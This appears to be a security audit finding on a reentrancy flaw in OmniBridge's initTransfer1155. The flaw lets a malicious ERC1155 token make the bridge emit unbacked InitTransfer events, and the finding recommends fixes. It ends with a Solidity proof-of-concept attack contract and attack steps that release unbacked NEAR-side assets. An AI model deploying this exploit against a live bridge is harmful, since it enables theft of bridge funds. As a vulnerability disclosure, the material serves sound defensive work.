### Title
Reentrancy via Malicious ERC1155 Token in `initTransfer1155` Emits Unbacked `InitTransfer` Events — (File: `evm/src/omni-bridge/contracts/OmniBridge.sol`)

---

### Summary

`initTransfer1155` calls `IERC1155(tokenAddress).safeTransferFrom` on an attacker-supplied, untrusted contract. ERC1155's `safeTransferFrom` mandates a `onERC1155Received` callback on the recipient (the bridge itself). A malicious ERC1155 token can exploit this callback to (a) skip the actual token transfer entirely and (b) reenter `initTransfer1155` repeatedly. Because the bridge's only reentrancy defense is the `onERC1155Received` operator check — which is trivially satisfied when the bridge is the caller — the bridge emits one or more `InitTransfer` events without ever receiving any tokens. The NEAR side treats every emitted `InitTransfer` as proof that tokens are locked on EVM and will release the corresponding NEAR-side assets to the attacker's recipient.

---

### Finding Description

In `initTransfer1155`:

```
currentOriginNonce += 1;                          // (1) nonce incremented
...
IERC1155(tokenAddress).safeTransferFrom(          // (2) external call to untrusted token
    msg.sender, address(this), tokenId, amount, ""
);
...
emit BridgeTypes.InitTransfer(..., currentOriginNonce, ...);  // (3) event emitted after call
``` [1](#0-0) 

The ERC1155 standard requires that `safeTransferFrom` call `onERC1155Received` on the recipient. The bridge implements this hook as:

```solidity
function onERC1155Received(address operator, ...) external view override returns (bytes4) {
    if (operator != address(this)) revert ERC1155DirectSendNotAllowed();
    return this.onERC1155Received.selector;
}
``` [2](#0-1) 

The `operator` field in the ERC1155 standard is the address that called `safeTransferFrom`. Because the bridge itself calls `safeTransferFrom`, `operator == address(this)` is always true during `initTransfer1155`. The guard is therefore **always satisfied** and provides no protection against a malicious token.

A malicious ERC1155 token can implement `safeTransferFrom` to:
1. Transfer zero tokens (or nothing at all).
2. Call `bridge.onERC1155Received(bridge_address, ...)` with `operator = bridge_address` — the check passes.
3. Optionally reenter `initTransfer1155` before returning, incrementing `currentOriginNonce` again and emitting another `InitTransfer` with a fresh nonce.
4. Return normally.

The bridge then emits `InitTransfer` (step 3 above) with no tokens ever locked. The NEAR side's documented invariant is: *"The NEAR side will treat any emitted event as proof that tokens are held."* [3](#0-2) 

There is no `ReentrancyGuard` or balance-delta check anywhere in `initTransfer1155`.

---

### Impact Explanation

**Critical.** The NEAR side relies solely on `InitTransfer` events to authorize releasing assets. An attacker who causes the bridge to emit `InitTransfer` without locking any ERC1155 tokens receives NEAR-side assets backed by nothing. Each reentrant call produces a distinct nonce (because `currentOriginNonce` is incremented before the external call), so every fake event is independently valid and will be independently settled on NEAR. This is an unauthorized release of bridge assets through a verification failure — the bridge fails to verify that the token transfer actually occurred.

---

### Likelihood Explanation

**High.** The entry point `initTransfer1155` is fully public and permissionless. `logMetadata1155` (also permissionless) allows the attacker to register the malicious token so the NEAR side recognizes the deterministic address. No privileged role, leaked key, or external dependency compromise is required. Any user can deploy a malicious ERC1155 contract and call `initTransfer1155` directly. [4](#0-3) 

---

### Recommendation

1. **Add `ReentrancyGuard`**: Import OpenZeppelin's `ReentrancyGuardUpgradeable` and apply `nonReentrant` to `initTransfer1155` (and `initTransfer` for ERC777 parity).
2. **Balance-delta check**: Record `IERC1155(tokenAddress).balanceOf(address(this), tokenId)` before and after `safeTransferFrom`; revert if the delta is less than `amount`. This ensures the transfer actually occurred regardless of the token's implementation.
3. **Token allowlist**: Consider requiring that ERC1155 tokens be registered via an admin-gated flow (analogous to `deployToken` for ERC20s) before `initTransfer1155` accepts them.

### Proof of Concept

```solidity
contract MaliciousERC1155 {
    OmniBridge bridge;
    uint256 tokenId = 1;
    uint128 amount  = 1000;
    bool reentered  = false;

    // Called by bridge: IERC1155(this).safeTransferFrom(attacker, bridge, tokenId, amount, "")
    function safeTransferFrom(address, address, uint256, uint256, bytes calldata) external {
        // Step 1: call onERC1155Received with operator = bridge (msg.sender here)
        //         The bridge's guard checks operator == address(bridge) → passes.
        IERC1155Receiver(msg.sender).onERC1155Received(
            msg.sender, address(this), tokenId, amount, ""
        );

        // Step 2: reenter to emit a second fake InitTransfer with a new nonce
        if (!reentered) {
            reentered = true;
            bridge.initTransfer1155(address(this), tokenId, amount, 0, 0, "attacker.near", "");
        }
        // No tokens are ever transferred.
    }

    function balanceOf(address, uint256) external pure returns (uint256) { return 1e18; }
    // ... minimal ERC1155 stubs
}

// Attack:
// 1. Deploy MaliciousERC1155
// 2. bridge.logMetadata1155(malicious, tokenId)   // permissionless registration
// 3. bridge.initTransfer1155(malicious, tokenId, 1000, 0, 0, "attacker.near", "")
//    → emits InitTransfer(nonce=1) and InitTransfer(nonce=2), zero tokens locked
//    → NEAR releases 2×1000 tokens to attacker.near
``` [5](#0-4) [6](#0-5)
